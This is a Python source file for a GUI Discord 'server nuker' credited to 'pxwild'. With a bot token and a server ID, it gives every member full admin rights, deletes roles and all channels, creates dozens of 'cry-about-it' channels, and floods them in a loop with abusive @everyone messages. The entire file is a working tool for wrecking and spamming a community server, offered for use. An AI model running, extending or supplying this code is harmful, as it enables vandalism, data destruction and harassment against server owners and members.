import os
import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import discord
from discord.ext import commands
from discord import Permissions
import random
import colorama
from colorama import Fore, Style
import customtkinter as ctk
import asyncio

colorama.init()

fsociety_red = "#6409e3"
fsociety_dark = "#000000"
fsociety_gray = "#1a1a1a"
fsociety_light = "#2a2a2a"
fsociety_text = "#d0d0d0"

class DiscordNukerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Server Nuker - pxwild")
        self.root.geometry("900x700")
        self.root.resizable(False, False)
        
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("dark-blue")
        
        self.main_frame = ctk.CTkFrame(root, fg_color=fsociety_dark)
        self.main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.header_frame = ctk.CTkFrame(self.main_frame, height=120, fg_color=fsociety_dark)
        self.header_frame.pack(fill="x", pady=(0, 10))
        
        self.title_label = ctk.CTkLabel(
            self.header_frame, 
            text="SERVER NUKER", 
            font=ctk.CTkFont(family="Courier New", size=28, weight="bold"), 
            text_color=fsociety_red
        )
        self.title_label.pack(pady=(10, 0))
        
        self.subtitle_label = ctk.CTkLabel(
            self.header_frame, 
            text="Made by pxwild", 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        self.subtitle_label.pack()
        
        self.config_frame = ctk.CTkFrame(self.main_frame, fg_color=fsociety_gray)
        self.config_frame.pack(fill="x", pady=(0, 10))
        
        self.token_label = ctk.CTkLabel(
            self.config_frame, 
            text="Bot Token:", 
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12)
        )
        self.token_label.grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        self.token_entry = ctk.CTkEntry(
            self.config_frame, 
            width=400,
            corner_radius=0,
            font=ctk.CTkFont(family="Courier New", size=12),
            fg_color=fsociety_light,
            border_color=fsociety_red,
            text_color=fsociety_text
        )
        self.token_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        self.server_label = ctk.CTkLabel(
            self.config_frame, 
            text="Server ID:", 
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12)
        )
        self.server_label.grid(row=1, column=0, sticky="w", padx=5, pady=5)
        
        self.server_entry = ctk.CTkEntry(
            self.config_frame, 
            width=400,
            corner_radius=0,
            font=ctk.CTkFont(family="Courier New", size=12),
            fg_color=fsociety_light,
            border_color=fsociety_red,
            text_color=fsociety_text
        )
        self.server_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        
        self.owner_label = ctk.CTkLabel(
            self.config_frame, 
            text="Your Username:", 
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12)
        )
        self.owner_label.grid(row=2, column=0, sticky="w", padx=5, pady=5)
        
        self.owner_entry = ctk.CTkEntry(
            self.config_frame, 
            width=400,
            corner_radius=0,
            font=ctk.CTkFont(family="Courier New", size=12),
            fg_color=fsociety_light,
            border_color=fsociety_red,
            text_color=fsociety_text
        )
        self.owner_entry.grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        
        self.save_button = ctk.CTkButton(
            self.config_frame, 
            text="Save Config", 
            command=self.save_config,
            corner_radius=0,
            fg_color=fsociety_dark,
            hover_color=fsociety_red,
            border_color=fsociety_red,
            border_width=1,
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold")
        )
        self.save_button.grid(row=3, column=1, sticky="e", padx=5, pady=5)
        
        self.console_frame = ctk.CTkFrame(self.main_frame, fg_color=fsociety_gray)
        self.console_frame.pack(fill="both", expand=True)
        
        self.console = scrolledtext.ScrolledText(
            self.console_frame, 
            bg=fsociety_light, 
            fg=fsociety_text, 
            insertbackground=fsociety_text,
            font=("Courier New", 10),
            wrap=tk.WORD,
            borderwidth=0,
            highlightthickness=0
        )
        self.console.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.button_frame = ctk.CTkFrame(self.main_frame, fg_color=fsociety_dark)
        self.button_frame.pack(fill="x", pady=(10, 0))
        
        self.start_button = ctk.CTkButton(
            self.button_frame, 
            text="Start Bot", 
            command=self.start_bot,
            corner_radius=0,
            fg_color=fsociety_dark,
            hover_color=fsociety_red,
            border_color=fsociety_red,
            border_width=1,
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold")
        )
        self.start_button.pack(side="left", padx=5, pady=5)
        
        self.stop_button = ctk.CTkButton(
            self.button_frame, 
            text="Stop Bot", 
            command=self.stop_bot,
            corner_radius=0,
            fg_color=fsociety_dark,
            hover_color=fsociety_red,
            border_color=fsociety_red,
            border_width=1,
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold")
        )
        self.stop_button.pack(side="left", padx=5, pady=5)
        
        self.nuke_button = ctk.CTkButton(
            self.button_frame, 
            text="NUKE SERVER", 
            command=self.execute_nuke,
            corner_radius=0,
            fg_color=fsociety_dark,
            hover_color=fsociety_red,
            border_color=fsociety_red,
            border_width=1,
            text_color=fsociety_text,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold")
        )
        self.nuke_button.pack(side="left", padx=5, pady=5)
        
        self.client = None
        self.bot_thread = None
        self.running = False
        self.nuke_active = False
        
        self.SPAM_CHANNEL = "cry-about-it"
        self.SPAM_MESSAGE = [
            "# @everyone SERVER NUKED BY PXWILD",
            "# @everyone GET FUCKED LMAO",
            "# @everyone CRY ABOUT IT",
            "# @everyone NUKED BY THE BEST (PXWILD)",
            "# @everyone SERVER OWNER IS A SKID",
            "# @everyone L + RATIO + NUKED",
            "# @everyone GET GOOD GET NUKED",
            "# @everyone YOUR SERVER IS DEAD"
        ]
        
        self.banner = r'''
                         _ __    __
    ____  _  ___      __(_) /___/ /
   / __ \| |/_/ | /| / / / / __  / 
  / /_/ />  < | |/ |/ / / / /_/ /  
 / .___/_/|_| |__/|__/_/_/\__,_/   
/_/ 
   ▄     ▄   █  █▀ ▄███▄   
    █     █  █▄█   █▀   ▀  
██   █ █   █ █▀▄   ██▄▄    
█ █  █ █   █ █  █  █▄   ▄▀ 
█  █ █ █▄ ▄█   █   ▀███▀   
█   ██  ▀▀▀   ▀            
                          
 ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀█▀▀▄ 
▐ ▄▀   █ █      █ █    █  ▐ 
  █▄▄▄▀  █      █ ▐   █     
  █   █  ▀▄    ▄▀    █      
 ▄▀▄▄▄▀    ▀▀▀▀    ▄▀       
█    ▐            █         
▐                 ▐               
  Made By pxwild
'''
        
        self.load_config()
    
    def save_config(self):
        config = {
            'token': self.token_entry.get(),
            'server_id': self.server_entry.get(),
            'owner': self.owner_entry.get()
        }
        
        with open('nuker_config.txt', 'w') as f:
            for key, value in config.items():
                f.write(f"{key}={value}\n")
        
        self.print_to_console("Configuration saved successfully.")
    
    def load_config(self):
        try:
            with open('nuker_config.txt', 'r') as f:
                for line in f:
                    if '=' in line:
                        key, value = line.strip().split('=', 1)
                        if key == 'token':
                            self.token_entry.insert(0, value)
                        elif key == 'server_id':
                            self.server_entry.insert(0, value)
                        elif key == 'owner':
                            self.owner_entry.insert(0, value)
            self.print_to_console("Configuration loaded successfully.")
        except FileNotFoundError:
            self.print_to_console("No saved configuration found.")
    
    def print_to_console(self, message):
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
        self.root.update()
    
    def start_bot(self):
        token = self.token_entry.get()
        server_id = self.server_entry.get()
        owner = self.owner_entry.get()
        
        if not token:
            messagebox.showerror("Error", "Please enter bot token")
            return
        
        if self.running:
            messagebox.showinfo("Info", "Bot is already running")
            return
        
        self.print_to_console(self.banner)
        self.print_to_console("Starting bot...")
        
        self.running = True
        self.bot_thread = threading.Thread(target=self.run_bot, args=(token,), daemon=True)
        self.bot_thread.start()
    
    def run_bot(self, token):
        intents = discord.Intents.all()
        self.client = commands.Bot(command_prefix="!", intents=intents)
        
        @self.client.event
        async def on_ready():
            await self.client.change_presence(activity=discord.Game(name="Nuking Servers"))
            self.print_to_console(f"Logged in as {self.client.user.name} ({self.client.user.id})")
            self.print_to_console(f"Bot is in {len(self.client.guilds)} servers")
        
        try:
            self.client.run(token)
        except Exception as e:
            self.print_to_console(f"Error running bot: {e}")
            self.running = False
            self.nuke_active = False
    
    def stop_bot(self):
        if self.client:
            self.nuke_active = False
            asyncio.run_coroutine_threadsafe(self.client.close(), self.client.loop)
            self.running = False
            self.print_to_console("Stopping bot...")
        else:
            self.print_to_console("Bot is not running.")
    
    async def _delete_first_5_roles(self, guild):
        try:
            roles_deleted = 0
            for role in guild.roles:
                if roles_deleted >= 5:
                    break
                try:
                    if role.name != "@everyone" and not role.managed:
                        await role.delete()
                        self.print_to_console(Fore.RED + f"Deleted role: {role.name}" + Fore.RESET)
                        roles_deleted += 1
                        await asyncio.sleep(0.1)
                except Exception as e:
                    self.print_to_console(Fore.YELLOW + f"Failed to delete role {role.name}: {e}" + Fore.RESET)
        except Exception as e:
            self.print_to_console(Fore.RED + f"Error in role deletion: {e}" + Fore.RESET)
    
    async def _delete_all_channels_fast(self, guild):
        try:
            delete_tasks = []
            for channel in guild.channels:
                delete_tasks.append(channel.delete())
            
            await asyncio.gather(*delete_tasks, return_exceptions=True)
            self.print_to_console(Fore.RED + "Deleted ALL channels super fast!" + Fore.RESET)
        except Exception as e:
            self.print_to_console(Fore.RED + f"Error in fast channel deletion: {e}" + Fore.RESET)
    
    async def _create_spam_channels_fast(self, guild, count=30):
        try:
            create_tasks = []
            for i in range(count):
                channel_name = f"{self.SPAM_CHANNEL}-{i+1}"
                create_tasks.append(guild.create_text_channel(channel_name))
            
            await asyncio.gather(*create_tasks, return_exceptions=True)
            self.print_to_console(Fore.MAGENTA + f"Created {count} spam channels super fast!" + Fore.RESET)
        except Exception as e:
            self.print_to_console(Fore.RED + f"Error in fast channel creation: {e}" + Fore.RESET)
    
    async def _spam_all_channels_simultaneously(self, guild):
        try:
            while self.nuke_active:
                send_tasks = []
                for channel in guild.channels:
                    if isinstance(channel, discord.TextChannel):
                        message = random.choice(self.SPAM_MESSAGE)
                        send_tasks.append(channel.send(message))
                
                await asyncio.gather(*send_tasks, return_exceptions=True)
                self.print_to_console(Fore.CYAN + "Spammed in ALL channels simultaneously!" + Fore.RESET)
                
                await asyncio.sleep(0.5)
                
        except Exception as e:
            self.print_to_console(Fore.RED + f"Critical spamming error: {e}" + Fore.RESET)

    async def _nuke_server(self, guild_id):
        try:
            guild = self.client.get_guild(int(guild_id))
            if not guild:
                self.print_to_console("Error: Could not find server with that ID")
                return
            
            self.nuke_active = True
            self.print_to_console(f"Starting nuke on server: {guild.name} (ID: {guild.id})")
            
            try:
                role = guild.default_role
                await role.edit(permissions=Permissions.all())
                self.print_to_console(Fore.MAGENTA + "Gave everyone admin permissions" + Fore.RESET)
            except Exception as e:
                self.print_to_console(Fore.YELLOW + f"Failed to give everyone admin: {e}" + Fore.RESET)
            
            await self._delete_first_5_roles(guild)
            
            await self._delete_all_channels_fast(guild)
            
            await self._create_spam_channels_fast(guild, count=35)
            
            spam_task = asyncio.create_task(self._spam_all_channels_simultaneously(guild))
            
            while self.nuke_active:
                await asyncio.sleep(1)
            
            spam_task.cancel()
            
            self.print_to_console(Fore.GREEN + "Nuclear bombardment complete!" + Fore.RESET)
            
        except Exception as e:
            self.print_to_console(Fore.RED + f"Critical error during nuke: {e}" + Fore.RESET)
        finally:
            self.nuke_active = False

    def execute_nuke(self):
        if not self.client:
            self.print_to_console("Error: Bot is not running")
            return
            
        server_id = self.server_entry.get()
        if not server_id:
            self.print_to_console("Error: Please enter a server ID")
            return
            
        if not server_id.isdigit():
            self.print_to_console("Error: Server ID must be a number")
            return
            
        self.print_to_console("Starting nuke sequence...")
        asyncio.run_coroutine_threadsafe(self._nuke_server(server_id), self.client.loop)

if __name__ == "__main__":
    root = ctk.CTk()
    app = DiscordNukerApp(root)
    root.mainloop()